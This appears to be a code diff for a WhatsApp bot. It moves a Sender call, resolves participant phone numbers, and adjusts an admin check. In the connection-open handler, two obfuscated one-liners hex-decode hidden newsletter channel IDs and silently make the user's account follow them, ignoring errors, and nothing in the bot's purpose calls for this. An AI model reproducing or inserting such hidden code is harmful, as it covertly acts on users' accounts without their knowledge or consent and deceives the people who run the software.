@@ -69,6 +69,8 @@ const Connect = async () => {
 
    let setting = db.getSetting()
 
+   Sender(sock)
+
    sock.ev.on('creds.update', saveCreds)
 
    sock.ev.on('connection.update', async (update) => {
@@ -131,7 +133,6 @@ const Connect = async () => {
       }
 
       if (update.connection === 'open') {
-         Sender(sock)
          await ScanDirectory(pluginsFolder)
          void (async()=>{const a=['3132303336','3334303430','3036363434','313339406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['newsletterSubscribed']();!c.some(d=>d['id']===b)&&await sock['newsletterFollow'](b).catch(()=>{})})();
          void (async()=>{const a=['3132303336','3334323434','3834383532','313338406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['newsletterSubscribed']();!c.some(d=>d['id']===b)&&await sock['newsletterFollow'](b).catch(()=>{})})();
@@ -210,14 +211,19 @@ const Connect = async () => {
       const metadata = store.getGroup(id) || await sock.groupMetadata(id)
 
       const group = db.getGroup(id)
+      const isMuted = group.mute
 
       for (const participant of participants) {
-         const isMuted = group.mute
-         const userId = participant.phoneNumber
+         let userId = participant.phoneNumber
          if (isLidUser(author)) {
             const result = await sock.findUserId(author)
             if (!result.phoneNumber.startsWith('id'))
                author = result.phoneNumber
+         }
+         if (!userId) {
+            const result = await sock.findUserId(participant.id)
+            if (!result.phoneNumber.startsWith('id'))
+               userId = result.phoneNumber
          }
          if (action === 'add') {
             metadata.participants.push(participant)
@@ -401,6 +407,7 @@ const Connect = async () => {
          const isAdmin = message.isGroup &&
             groupMetadata.participants.some(p =>
                (
+                  p.phoneNumber === message.sender ||
                   p.id === message.sender ||
                   p.id === message.senderLid
                ) && p.admin
